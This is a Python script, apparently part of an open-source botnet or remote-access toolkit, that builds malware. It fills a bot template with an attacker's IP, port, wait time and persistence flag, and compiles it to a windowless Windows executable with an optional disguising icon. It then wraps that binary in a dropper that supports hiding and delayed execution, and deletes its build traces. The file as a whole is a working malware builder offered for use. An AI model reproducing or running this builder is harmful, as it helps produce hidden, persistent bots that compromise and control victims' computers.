# Date: 09/01/2018
# Author: Pure-L0G1C
# Description: Execute creator

from os import remove
from os.path import sep
from lib.file import File
from lib.args import Args
from subprocess import Popen

# pyinstaller
try:
    from PyInstaller import is_win
except:
    from sys import exit
    print('Please install Pyinstaller')
    exit(-1)

class Executor(object):

    def __init__(self, ip, port, filename, delay, wait, exe, icon, hide, persist):
        self.ip = ip
        self.exe = exe
        self.port = port
        self.hide = hide
        self.wait = wait
        self.icon = icon
        self.binary = b''
        self.delay = delay
        self.persist = persist
        self.filename = filename
        self.bot_template = 'bot' + sep + 'template_bot.py'
        self.bot_py_temp = 'bot' + sep + '{}.py'.format(filename)
        self.bot_compiled = 'dist' + sep + '{}.exe'.format(filename)

        self.dropper_compiled = self.bot_compiled
        self.dropper_template = 'lib' + sep + 'dropper.py'
        self.dropper_py_temp = 'lib' + sep + '{}.py'.format(filename)

    def replace(self, data, _dict):
        for k in _dict:
            data = data.replace(k, _dict[k])
        return data

    def compile_file(self, path):
        cmd = 'pyinstaller -F -w {} {}'.format('' if not self.icon else '-i {}'.format(self.icon), path)
        Popen(cmd.split()).wait()

    def write_template(self, template, py_temp, _dict):
        data = ''
        for _data in File.read(template, False):
            data += _data

        File.write(py_temp, self.replace(data, _dict))
        if self.exe:
            self.compile_file(py_temp)

    def compile_bot(self):
        _dict = {
                 'addr_ip': repr(self.ip),
                 'addr_port': str(self.port),
                 'wait_time': str(self.wait),
                 'auto_persist': repr(self.persist)
        }

        self.write_template(self.bot_template, self.bot_py_temp, _dict)
        if self.exe:
            for data in File.read(self.bot_compiled):
                self.binary += data

    def compile_dropper(self):
        _dict = {
         'data_name': repr('_{}.exe'.format(self.filename)),
         'data_binary': repr(self.binary),
         'data_hide': str(self.hide),
         'data_delay': str(self.delay)
        }

        self.write_template(self.dropper_template, self.dropper_py_temp, _dict)

    def start(self):
        self.compile_bot()
        if self.exe:
            self.compile_dropper()
            self.clean_up()

    def clean_up(self):
        spec_file = '{}.spec'.format(self.filename)
        remove(self.dropper_py_temp)
        remove(self.bot_py_temp)
        remove(spec_file)

if __name__ == '__main__':
    args = Args()
    if args.set_args():
        executor = Executor(args.ip, args.port, args.name, args.delay, args.wait, args.type, args.icon, args.hide, args.persist)

        executor.start()
        Popen('cls' if is_win else 'clear', shell=True).wait()
        print('\nFinished creating {}'.format(executor.filename + '.exe' if executor.exe else executor.bot_py_temp))
        print('Look in the directory named dist for your exe file' if executor.exe else 'Look in the directory named bot for your Python file')
